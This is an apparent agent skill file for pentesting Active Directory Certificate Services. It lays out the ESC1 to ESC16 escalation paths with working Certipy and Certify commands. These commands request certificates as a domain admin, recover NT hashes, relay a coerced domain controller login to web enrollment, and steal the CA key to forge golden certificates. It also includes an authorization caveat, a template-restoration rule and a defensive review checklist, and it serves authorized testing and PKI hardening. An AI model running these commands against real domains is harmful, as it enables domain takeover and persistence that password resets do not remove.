---
name: abusing-adcs
description: Enumerate and abuse Active Directory Certificate Services with Certipy and Certify — the ESC1 through ESC16 escalation paths, vulnerable template and CA configurations, NTLM relay to web enrollment, certificate-based authentication and persistence, and the strong-mapping changes that gate several of them. Use when a domain has a certificate authority, when Certipy or BloodHound reports vulnerable templates, or when escalating from a low-privilege domain user.
---

# Abusing AD CS

A certificate authority in an Active Directory domain is usually the shortest
path from a standard user to domain administrator, because certificate
templates are permission objects that almost nobody audits. A single template
that lets the enrollee supply their own subject name is a full domain
compromise, and it is the default on more networks than it should be.

Only against domains you are authorized to test.

## When to Use

- The domain has a CA (`pKIEnrollmentService` objects exist)
- `certipy find` or BloodHound reports vulnerable templates
- You have any domain credential and need a privilege escalation path
- You need durable domain persistence that survives a password reset
- Reviewing PKI configuration defensively

## When NOT to Use

- **General AD attacks** (Kerberoasting, DCSync, lateral movement) — use
  `attacking-active-directory`
- **Delegation abuse** — use `attacking-kerberos-delegation`
- **Entra ID / cloud PKI** — use `attacking-entra-id`
- **Detecting these attacks** — use `engineering-detections`; certificate
  request events (4886/4887) are the primary telemetry

## Enumerate First

```bash
# Certipy — the standard tool; run this before anything else
certipy find -u user@domain.local -p 'Password' -dc-ip 10.0.0.10 -vulnerable -stdout
certipy find -u user@domain.local -p 'Password' -dc-ip 10.0.0.10 -old-bloodhound

# From Windows
Certify.exe find /vulnerable
Certify.exe cas                      # CA hosts, flags, and enrollment endpoints
```

`certipy find -vulnerable` names the ESC number directly, which is why it is
the first command. Read the output for: who can enroll, whether the requester
supplies the subject, which EKUs are present, and whether manager approval is
required.

## The Escalation Paths

Grouped by what is misconfigured, because the fix and the detection differ.

### Template misconfiguration — the common cases

| ID | Condition | Result |
| --- | --- | --- |
| **ESC1** | Enrollee supplies subject (`ENROLLEE_SUPPLIES_SUBJECT`) + client-auth EKU + low-priv enrollment + no approval | Request a cert *as any user*, including a domain admin |
| **ESC2** | Any Purpose EKU (or no EKU) + low-priv enrollment | Cert usable for client auth; same outcome as ESC1 |
| **ESC3** | Certificate Request Agent EKU | Enroll on behalf of another user |
| **ESC9** | `CT_FLAG_NO_SECURITY_EXTENSION` set | Cert lacks the SID binding, enabling weak-mapping abuse |
| **ESC15** | v1 template with enrollee-supplied subject, application policies injectable | Client auth via application policy, bypassing the EKU restriction |

```bash
# ESC1 — the canonical path
certipy req -u user@domain.local -p 'Password' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -template 'VulnTemplate' -upn 'administrator@domain.local'

# Authenticate with the certificate and recover the NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
# → TGT plus the account's NT hash
```

### Access-control misconfiguration

| ID | Condition | Result |
| --- | --- | --- |
| **ESC4** | You have write over a template object | Reconfigure it into an ESC1 template, use it, then restore |
| **ESC5** | Write over PKI objects, CA computer object, or the container | Various, up to CA control |
| **ESC7** | `ManageCA` or `ManageCertificates` on the CA | Enable ESC6, or approve your own pending request |

```bash
# ESC4 — make it vulnerable, use it, put it back
certipy template -u user@domain.local -p 'Password' -template 'WriteableTemplate' -save-old
# ... request as in ESC1 ...
certipy template -u user@domain.local -p 'Password' -template 'WriteableTemplate' -configuration WriteableTemplate.json
```

**Restoring the template is not optional.** Leaving a template in a vulnerable
state is a real change to the client's security posture, and doing so
unannounced is a finding against you, not them. `-save-old` first, restore
immediately, and record both actions with timestamps.

### CA misconfiguration

| ID | Condition | Result |
| --- | --- | --- |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA | Any template becomes subject-suppliable |
| **ESC16** | Security extension disabled CA-wide | Every issued cert lacks SID binding |

```bash
# Check the CA flags
certutil -config "CA-HOST\CORP-CA" -getreg policy\EditFlags
```

### Relay paths

| ID | Condition | Result |
| --- | --- | --- |
| **ESC8** | Web enrollment (`/certsrv`) reachable, no EPA/HTTPS binding | Relay NTLM to enrollment, get a cert for the relayed machine |
| **ESC11** | `ICertPassage` RPC without packet integrity | Relay over RPC instead of HTTP |

```bash
# ESC8: coerce authentication from a DC, relay it to web enrollment
certipy relay -ca 10.0.0.20 -template DomainController
# in another shell, coerce:
coercer coerce -u user -p 'Password' -t 10.0.0.10 -l 10.0.0.100
# or PetitPotam / printerbug
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10     # → DC machine account → DCSync
```

### Certificate mapping

| ID | Condition | Result |
| --- | --- | --- |
| **ESC10** | Weak certificate mapping registry values | Impersonate via UPN or altSecurityIdentities |
| **ESC13** | Template with an issuance policy linked to a group | Cert grants that group's membership |
| **ESC14** | Write access to `altSecurityIdentities` | Map your certificate to a target account |

**Strong certificate binding changes the picture.** After the May 2022 updates
(KB5014754), domain controllers can require certificates to carry the SID
security extension, and `StrongCertificateBindingEnforcement` governs how
strictly. On a fully-enforcing domain, ESC9, ESC10, and Certifried
(CVE-2022-26923) stop working, while ESC1, ESC4, ESC6, and ESC8 do not. Check
the enforcement level before reporting a path as exploitable:

```bash
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
# 0 = disabled, 1 = compatibility (default for a period), 2 = full enforcement
```

## Persistence

Certificates are the most durable AD persistence available, which is exactly
why they matter in a report.

- A user certificate remains valid for its lifetime **through password
  resets**. Resetting the compromised account does not evict the attacker.
- **Stealing the CA's private key** (`THEFT2` / Golden Certificate) allows
  forging certificates for any principal, indefinitely, offline. Recovering
  from that requires re-issuing the PKI.
- Revocation is the only remedy, and most environments do not check CRLs
  promptly or at all.

```bash
# Extract the CA key with local admin on the CA host (DPAPI-protected)
certipy ca -backup -u user@domain.local -p 'Password' -ca 'CORP-CA'
# Forge offline
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local
```

State this explicitly when reporting: "password resets do not remediate this;
the issued certificates must be revoked" is the sentence that changes the
client's response plan.

## Defensive Review

When the engagement is a configuration review rather than an attack:

- Which templates allow enrollee-supplied subjects, and who can enroll?
- Which templates have client-auth or Any-Purpose EKUs available to
  `Domain Users` or `Authenticated Users`?
- Is manager approval required on sensitive templates?
- Is `EDITF_ATTRIBUTESUBJECTALTNAME2` set anywhere?
- Is web enrollment exposed, and does it enforce HTTPS with EPA?
- Is `StrongCertificateBindingEnforcement` at full enforcement?
- Who holds `ManageCA` and `ManageCertificates`?
- Is certificate issuance monitored (events 4886, 4887, 4899, 4900)?

## Rationalizations to Reject

- *"The template requires manager approval, so it's safe."* Check ESC7 — a
  `ManageCertificates` holder approves their own request.
- *"Only Domain Admins can enroll."* Read the ACL rather than the name. Groups
  nest, and `Authenticated Users` appears more often than expected.
- *"We patched for Certifried."* That closes one path. ESC1 and ESC8 are
  configuration, not patchable.
- *"We reset the compromised account's password."* The certificate is still
  valid. Revoke it.
- *"It's an internal CA, low severity."* An internal CA that issues domain
  authentication certificates is a domain admin equivalent.
- *"BloodHound didn't show it."* Collect with a certificate-aware collector;
  older collections have no ADCS edges at all.
- *"I'll leave the template modified, it's easier."* No.

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Credential Access** (TA0006)

- [T1649](https://attack.mitre.org/techniques/T1649/) Steal or Forge Authentication Certificates — see also `attacking-active-directory`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- `attacking-active-directory` — the wider domain attack path
- `attacking-kerberos-delegation` — the other high-yield AD escalation family
- `engineering-detections` — certificate issuance and template change telemetry
- `reporting-security-findings` — how to state the revocation requirement
- Certipy, Certify, PKIAudit, BloodHound (ADCS edges), Coercer, PetitPotam
